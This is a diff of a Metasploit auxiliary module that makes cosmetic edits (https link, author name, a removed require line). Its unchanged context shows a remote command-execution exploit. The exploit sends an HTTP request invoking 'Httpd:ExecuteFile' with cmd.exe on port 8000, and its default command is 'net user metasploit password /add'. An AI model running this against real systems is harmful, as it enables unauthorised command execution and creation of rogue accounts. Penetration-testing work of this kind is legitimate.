@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -22,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
         systems, however at this stage the module only works against Windows.
         This module does not apply to HP printers.
       },
-      'Author'         => [ 'patrick' ],
+      'Author'         => [ 'aushack' ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
@@ -37,7 +32,7 @@ class MetasploitModule < Msf::Auxiliary
         [
           Opt::RPORT(8000),
           OptString.new('CMD', [ false, "The command to execute.", "net user metasploit password /add" ]),
-        ], self.class)
+        ])
   end
 
   def run
@@ -49,5 +44,4 @@ class MetasploitModule < Msf::Auxiliary
         'data'    => 'obj=Httpd:ExecuteFile(,cmd.exe,/c,' + cmd + ',)'
       }, 3)
   end
-
 end
